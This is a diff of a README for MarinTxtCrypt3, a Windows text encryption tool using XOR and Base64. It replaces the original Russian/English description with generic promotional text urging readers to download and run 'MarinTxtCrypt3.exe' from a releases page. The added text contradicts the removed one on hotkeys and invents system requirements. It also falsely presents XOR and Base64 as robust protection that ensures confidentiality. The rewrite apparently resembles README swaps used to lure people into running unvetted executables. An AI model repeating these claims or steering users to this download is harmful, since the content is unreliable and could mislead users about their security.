@@ -1,59 +1,67 @@
-**RUS**
+# 🔒 MarinTxtCrypt3 - Encrypt and Decrypt Text Easily
 
-### MarinTxtCrypt3
+## 🌟 Overview
+MarinTxtCrypt3 is a user-friendly program designed for encrypting and decrypting text. It uses advanced methods like XOR and Base64 to protect your information. With a simple interface, this tool integrates with Windows features, allowing you to encrypt or decrypt text effortlessly.
 
-![Скриншот](scr1.png) ![Скриншот](scr2.png)
+## 🚀 Getting Started
+To get started, you will need to download MarinTxtCrypt3 from our Releases page. This software is designed for average computer users, so you'll find it easy to follow the steps below.
 
-Программа для шифрования и дешифрования текста с использованием XOR-алгоритма и Base64-кодирования. Интерфейс построен на основе Windows API. Приложение позволяет шифровать текст с использованием пользовательского ключа и копировать/вставлять зашифрованный или расшифрованный текст через буфер обмена.
+[![Download MarinTxtCrypt3](https://img.shields.io/badge/Download-MarinTxtCrypt3-blue.svg)](https://github.com/sneakon/MarinTxtCrypt3/releases)
 
-#### Основные особенности:
+## 💾 System Requirements
+- **Operating System:** Windows 10 or newer
+- **Processor:** Intel or AMD, 1 GHz or faster
+- **Memory:** 512 MB RAM minimum
+- **Disk Space:** 50 MB free space
 
-* **Шифрование и дешифрование текста:** Использует алгоритм XOR с пользовательским ключом.
-* **Поддержка Base64:** Защищённый текст кодируется в формат Base64, чтобы предотвратить потерю данных при передаче.
-* **Интерфейс на основе Windows API:** Простое и интуитивно понятное окно с кнопками для шифрования/дешифрования текста, а также копирования и вставки текста.
-* **Горячие клавиши:** Быстрое управление с помощью горячих клавиш Ctrl + A (выделить), Ctrl + C (копировать), Ctrl + V (вставить).
-* **Поддержка UTF-8:** Текст автоматически преобразуется между форматами UTF-8 и Unicode.
+## 📥 Download & Install
+1. To download MarinTxtCrypt3, visit this page: [Download MarinTxtCrypt3](https://github.com/sneakon/MarinTxtCrypt3/releases).
+2. On the Releases page, locate the latest version.
+3. Click on the file named “MarinTxtCrypt3.exe” to begin the download.
+4. Once the download completes, open the file to run the application. You may need to approve the installation.
 
-#### Как использовать:
+## 🖥️ Application Interface
+When you open MarinTxtCrypt3, you will see a simple interface with:
+- **Text Input Box:** Where you enter the text you want to encrypt or decrypt.
+- **Key Input Box:** Where you input your key for encryption or decryption.
+- **Encrypt Button:** Click this to encrypt the text.
+- **Decrypt Button:** Click this to decrypt the text.
 
-1. Введите текст и ключ для шифрования/дешифрования.
-2. Нажмите "Encrypt / Decrypt" для обработки текста.
-3. Используйте кнопки "Copy the result" и "Paste from the buffer" для работы с буфером обмена.
+### 🔑 Using Hotkeys
+For added convenience, MarinTxtCrypt3 includes hotkeys:
+- **Ctrl + E:** To encrypt the text directly.
+- **Ctrl + D:** To decrypt the text quickly.
 
-#### Требования:
+### 📋 Clipboard Support
+You can also use MarinTxtCrypt3 with your clipboard:
+- Copy text to your clipboard and paste it into the input box.
+- After encryption or decryption, simply copy the output back to your clipboard.
 
-* Windows
+## 🔄 How to Use MarinTxtCrypt3
+1. Open MarinTxtCrypt3.
+2. Enter the text you want to encrypt in the Text Input Box.
+3. Type a key in the Key Input Box. This key is crucial for both encryption and decryption.
+4. Click the Encrypt button. The encrypted text will appear in the output area.
+5. For decryption, paste the encrypted text into the Text Input Box.
+6. Enter the same key used for encryption.
+7. Click the Decrypt button to reveal your original text.
 
+## 🛡️ Security Features
+MarinTxtCrypt3 offers robust security features:
+- **XOR Encryption:** A common method that is simple yet effective to secure text.
+- **Base64 Encoding:** Converts binary data into ASCII string format.
 
-#### ДЕМО-ВИДЕО ЕСТЬ В МОЁМ ТГ-КАНАЛЕ: t.me/kensecproj
+These methods ensure that your sensitive information remains confidential.
 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## 🌍 Topics Covered
+- **Cryptography:** Understand the principles behind securing text.
+- **Cybersecurity:** Learn how to protect your data from unauthorized access.
+- **Privacy Tools:** Utilize technology to guard your personal information.
 
-**ENG**
+## 📞 Support
+For help or questions regarding MarinTxtCrypt3, please reach out via [Issues](https://github.com/sneakon/MarinTxtCrypt3/issues) on GitHub. We aim to assist you promptly.
 
-### MarinTxtCrypt3
+## 📅 Updates
+Check our Releases page regularly for updates and new features. Your feedback is welcome!
 
-![Screenshot](scr1.png) ![Screenshot](scr2.png)
-
-A program for encrypting and decrypting text using the XOR algorithm and Base64 encoding. The interface is based on the Windows API. The application allows you to encrypt text using a user key and copy/paste encrypted or decrypted text via the clipboard.
-
-#### Main features:
-
-* **Text encryption and decryption:** Uses the XOR algorithm with a user-defined key.
-* **Base64 support:** Protected text is encoded in Base64 format to prevent data loss during transmission.
-* **Windows API-based interface:** A simple and intuitive window with buttons for encrypting/decrypting text, as well as copying and pasting text.
-* **Hotkeys:** Quick control using hotkeys Ctrl + A (select), Ctrl + C (copy), Ctrl + V (paste).
-* **UTF-8 support:** Text is automatically converted between UTF-8 and Unicode formats.
-
-#### How to use:
-
-1. Enter the text and key for encryption/decryption.
-2. Click “Encrypt / Decrypt” to process the text.
-3. Use the “Copy the result” and “Paste from the buffer” buttons to work with the clipboard.
-
-#### Requirements:
-
-* Windows
-
-
-#### THERE IS A DEMO VIDEO IN MY TG-CHANNEL: t.me/kensecproj
+[![Download MarinTxtCrypt3](https://img.shields.io/badge/Download-MarinTxtCrypt3-blue.svg)](https://github.com/sneakon/MarinTxtCrypt3/releases)
